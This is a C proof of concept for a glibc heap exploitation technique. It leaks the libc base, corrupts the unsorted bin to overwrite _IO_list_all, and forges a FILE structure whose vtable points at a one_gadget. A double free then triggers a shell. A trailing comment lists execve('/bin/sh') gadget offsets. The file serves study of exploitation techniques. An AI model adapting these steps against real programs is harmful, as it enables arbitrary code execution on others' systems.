#include <stdio.h>
#include <stdlib.h>
#include <libio.h>

typedef unsigned long long ull;

void setvbufs()
{
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
}
int main()
{
	void *p1, *p2, *p3, *p4;
	ull *p;
	ull libc_base = 0;
	ull _IO_list_all = 0x3c5520;
	ull one_gadget = 0xf1147;
	
	setvbufs();
	p1=malloc(0x100);
	malloc(0x20);

	free(p1);
	malloc(0xa0);

	p2 = malloc(0x100);
	// now we have a 0x60 smallbin
	//
	// avoid smallbin to be alloced, use 0x100
	malloc(0x100);

	free(p2);
	libc_base = *(ull*)p2 - 0x3c4b78;
	*((ull*)p2+1) = libc_base+_IO_list_all - sizeof(void*)*2;

	malloc(0x100);

	p = (ull*)((ull)p1+0xa0);
	// 'p' pointer to the chain of _IO_list_all
	// fake _mode
	*p = 0;
	// _IO_write_base
	*(p+4) = 0;
	// _IO_write_ptr
	*(p+5) = 1;
	// __overflow in vtable
	*(p+3) = libc_base+one_gadget;
	// fake vtable
	*(ull*)((ull)p+0xd8) = (ull)p;
	
	// unsorted bin is corrputed
	// just trigger it
	p3 = malloc(0x20);
	free(p3);
	free(p3);


	return 0;
}

/*
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
*/
